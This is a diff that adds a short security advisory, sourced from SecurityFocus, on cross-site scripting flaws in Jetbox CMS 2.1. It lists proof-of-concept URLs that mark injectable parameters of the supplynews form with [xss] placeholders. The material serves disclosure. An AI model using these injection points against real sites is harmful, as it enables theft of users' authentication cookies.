@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/23999/info
+ 
+Jetbox CMS is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+ 
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials and to launch other attacks.
+ 
+Jetbox CMS 2.1 is vulnerable. 
+
+http://www.example.com/jetbox/index.php/view/supplynews/?companyname=[xss] 
+http://www.example.com/jetbox/index.php/view/supplynews/?companyname=1&country=[xss] 
+http://www.example.com/jetbox/index.php/view/supplynews/?companyname=1&country=1&email=[xss] http://www.example.com/jetbox/index.php/view/supplynews/?companyname=1&country=1&email=1&firstname=[xss] http://www.example.com/jetbox/index.php/view/supplynews/?companyname=1&country=1&email=1&firstname=1&middlename=[xss] 
+http://www.example.com/jetbox/index.php/view/supplynews/?companyname=1&country=1&email=1&firstname=1&middlename=1&recipient=jetbox@www.example2.com&require[xss] 
+http://www.example.com/jetbox/index.php/view/supplynews/?companyname=1&country=1&email=1&firstname=1&middlename=&recipient=jetbox@www.example2.com&required=firstname,surname,email,companyname,country,workphone,title,topic,website,text&signupsubmit=true&subject=News&submit=Send&surname=[xss] 
+http://www.example.com/jetbox/index.php/view/supplynews/?companyname=1&country=1&email=1&firstname=1&middlename=1&recipient=jetbox@www.example2.com&required=firstname,surname,email,companyname,country,workphone,title,topic,website,text&signupsubmit=true&subject=News&submit=Send&surname=1&text=1&title=[xss] 
